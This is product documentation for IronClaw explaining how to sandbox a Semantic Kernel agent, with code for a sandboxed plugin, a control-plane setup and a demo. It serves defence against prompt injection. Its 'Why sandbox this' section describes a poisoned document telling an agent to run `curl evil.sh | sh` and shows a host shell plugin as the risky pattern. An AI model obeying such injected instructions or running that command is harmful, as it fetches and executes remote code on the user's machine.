---
title: "Sandbox your Semantic Kernel agent with IronClaw"
description: How to sandbox a Microsoft Semantic Kernel agent. Run your kernel's untrusted plugin and code execution inside IronClaw's sealed gVisor sandbox, with the model key held host-side and every function call gated and audited, plus a credential-free way to see it work first.
---

# Sandbox your Semantic Kernel agent with IronClaw

You built an agent with **Semantic Kernel** (Microsoft): a `Kernel`, a chat
service, and a set of plugins — native `@kernel_function`s the model can call,
often a shell or code function so the agent can "just run it." That is a great way
to design the *behavior*. The problem starts when it runs somewhere real: SK's
function-calling loop executes your kernel functions **in your own process**, with
your API key in memory and unrestricted outbound network. One prompt-injected
instruction and that same process can read your environment, exfiltrate over the
network, or run a command you never intended.

IronClaw runs the same job behind a **sealed sandbox** instead: no network card,
the model key held **host-side** and never in the agent, and every privileged
function call routed through a human-approval gateway and an audit log.

!!! example "Runnable example"
    A one-command Semantic-Kernel-to-IronClaw example lives at
    [`examples/integrations/semantic-kernel`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/semantic-kernel):
    a native SK plugin (`sandboxed_shell`) whose commands run inside a real IronClaw
    per-session sandbox, with a blocked escape attempt printed at the end. It ships
    with the integration examples. The credential-free demo below runs the same
    sealed loop today.

## The two-shape fix

There are two ways to sandbox a Semantic Kernel agent, and you can use either.

**1. Keep the kernel, swap the plugin.** Replace the host-executing function you
register with one that runs every command inside an IronClaw sandbox. The kernel
plans the function calls exactly as before; only the execution moves into the box:

```python
from ironclaw_sandbox import IronClawSandbox
from ironclaw_tool import make_sandbox_tool

with IronClawSandbox() as sandbox:
    plugin = make_sandbox_tool(sandbox)        # a real SK native plugin
    kernel.add_plugin(plugin, plugin_name="ironclaw")
```

That plugin's `sandboxed_shell` `@kernel_function` is a drop-in for a host shell
function: **no network, no host filesystem, no Docker socket**. The full adapter is
~15 lines — see
[`ironclaw_tool.py`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/semantic-kernel/ironclaw_tool.py).

**2. Re-declare the agent to IronClaw.** Or move the whole agent behind IronClaw
and let the control-plane own the model key and the perimeter:

```sh
export OPENAI_API_KEY=sk-...   # host-side only; the sandbox never sees this key
./bin/controlplane --dev --api-addr 127.0.0.1:8787 &
ironctl agent create --name "Coder" --provider openai --model gpt-4o \
  --instructions "Run the commands the user asks for." \
  --tool read_file --tool write_file --yes
```

Same persona, same model, same functions, now behind a human-approval gateway and
an audit log.

## Why sandbox this

A typical Semantic Kernel plugin runs on your host with your privileges:

```python
from semantic_kernel.functions import kernel_function

class ShellPlugin:
    @kernel_function(name="run_shell")
    def run_shell(self, command: str) -> str:    # runs on YOUR box, YOUR privileges
        import subprocess
        return subprocess.run(command, shell=True, capture_output=True, text=True).stdout

kernel.add_plugin(ShellPlugin(), plugin_name="shell")
```

Three things are true of that snippet, and all three are risks:

1. **The key is in the process.** Anything that can read memory or `os.environ`
   can read `sk-...`.
2. **Functions run with your privileges.** `run_shell` executes on your box with
   your filesystem and network. A poisoned document that says "run
   `curl evil.sh | sh`" is a function call away.
3. **Egress is wide open.** The process can reach any host on the internet.

IronClaw closes all three by construction, not by convention.

## See it work first (no credentials)

Watch the sealed loop run with the offline `mock` provider. No model key, no
tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from kernel-land"}'

sleep 3
curl -s -H 'authorization: Bearer ironclaw-demo' \
  http://127.0.0.1:8787/v1/ui/chat/mock-agent/messages       # the reply
```

You get the reply echoed back, proof that a real per-session sandbox launched and
the answer flowed home through encrypted queues. Tear down with
`docker compose -f docker-compose.demo.yml down`. The one-command, self-checking
version is
[`examples/integrations/semantic-kernel`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/semantic-kernel).

## Port your Semantic Kernel agent

Map each part of the kernel onto an IronClaw agent group:

| Semantic Kernel | IronClaw | Notes |
|---|---|---|
| `OpenAIChatCompletion(ai_model_id="gpt-4o")` | `--provider openai --model gpt-4o` | Any [provider](../providers/index.md): `anthropic`, `openai`, `gemini`, `local`, and more. |
| API key on the chat service | `OPENAI_API_KEY` set **on the host** | The key is injected by the host model-proxy on the way out. It never enters the sandbox. |
| System prompt / persona | `--identity` / `--soul` / `--instructions` | The agent's persona, voice, and operating rules. |
| Native plugins (`@kernel_function`) | `--tool <name>` (built-in) or an MCP server | Built-ins: `read_file`, `write_file`, `list_dir`, `web_search`, `http_fetch`. Your own functions attach over [MCP](../mcp.md). |
| `kernel.invoke(...)` with `FunctionChoiceBehavior.Auto()` | a message to the agent group | Same request/response, now through the sealed queue. |

Your kernel functions that are *not* built in attach as an
[MCP server](../mcp.md): IronClaw registers them through the same human-approval
gateway, so a new function is a reviewed change, not a silent capability.

## What you gained

- **The key left the agent.** It lives host-side and is injected per request; a
  compromised agent has nothing to steal.
- **`network=none` by default.** The sandbox has no NIC. The only egress is the
  audited model-proxy socket, plus whatever hosts you explicitly allowlist.
- **Privileged actions are gated.** Registering a function, spawning another agent,
  or reaching a new host flows through a human-approval gateway and lands in the
  [audit log](../architecture.md).

Same agent you designed in Semantic Kernel. A perimeter it never had.

## Next

- [Choose your model provider](../providers/index.md)
- [MCP: bring your own tools](../mcp.md)
- [Security and isolation](../security-isolation.md)
